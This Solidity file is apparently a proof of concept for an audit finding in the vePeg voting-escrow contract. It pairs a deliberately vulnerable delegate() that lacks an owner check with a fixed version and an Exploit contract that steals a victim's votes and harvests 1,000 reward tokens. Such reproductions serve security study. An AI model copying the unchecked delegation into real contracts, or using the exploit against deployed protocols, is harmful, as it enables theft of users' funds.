// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hyperstable vePeg — Pashov, March 2025, C-01
    delegate(from, to) moves a lock's voting weight with no owner check.
    Lock 1 is the victim's and carries 1,000 votes. The caller delegates
    it to their own empty lock and harvests the 1,000 emission tokens
    those votes direct. The control requires the lock owner.
*/

contract Reward {
    string public symbol = "PEG";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VePeg {
    Reward public immutable reward;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public power;
    mapping(address => uint256) public votes;
    uint256 public harvested;

    constructor(Reward _reward) {
        reward = _reward;
    }

    function mintLock(address to, uint256 id, uint256 weight) external {
        ownerOf[id] = to;
        power[id] = weight;
        votes[to] += weight;
    }

    function delegate(uint256 _from, uint256 _to) public {
        // @> VULN: delegate does not require _isApprovedOrOwner(msg.sender, _from)
        _delegate(_from, _to);
    }

    function _delegate(uint256 _from, uint256 _to) internal {
        address fromOwner = ownerOf[_from];
        address toOwner = ownerOf[_to];
        uint256 weight = power[_from];
        votes[fromOwner] -= weight;
        votes[toOwner] += weight;
        power[_from] = 0;
        power[_to] += weight;
    }

    function harvest() external {
        uint256 pay = votes[msg.sender];
        harvested = pay;
        votes[msg.sender] = 0;
        reward.transfer(msg.sender, pay);
    }
}

contract VePegFixed {
    Reward public immutable reward;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public power;
    mapping(address => uint256) public votes;

    constructor(Reward _reward) {
        reward = _reward;
    }

    function mintLock(address to, uint256 id, uint256 weight) external {
        ownerOf[id] = to;
        power[id] = weight;
        votes[to] += weight;
    }

    function delegate(uint256 _from, uint256 _to) public {
        require(ownerOf[_from] == msg.sender, "not owner");
        _delegate(_from, _to);
    }

    function _delegate(uint256 _from, uint256 _to) internal {
        address fromOwner = ownerOf[_from];
        address toOwner = ownerOf[_to];
        uint256 weight = power[_from];
        votes[fromOwner] -= weight;
        votes[toOwner] += weight;
    }
}

contract Exploit {
    address public constant VICTIM = address(uint160(uint256(keccak256("victim"))));
    Reward public reward;
    VePeg public peg;
    uint256 public stolenVotes;

    constructor() {
        reward = new Reward();
        peg = new VePeg(reward);
    }

    function run() external {
        peg.mintLock(VICTIM, 1, 1_000 ether);
        peg.mintLock(address(this), 2, 0);
        reward.mint(address(peg), 1_000 ether);
        stolenVotes = peg.votes(VICTIM);
        peg.delegate(1, 2);
        require(peg.ownerOf(1) == VICTIM, "still victim nft");
        require(peg.votes(VICTIM) == 0, "victim votes gone");
        require(peg.votes(address(this)) == 1_000 ether, "attacker has 1000");
        peg.harvest();
        require(peg.harvested() == 1_000 ether, "harvest");
        require(reward.balanceOf(address(this)) == 1_000 ether, "paid");
        require(reward.balanceOf(address(peg)) == 0, "gauge empty");
    }
}
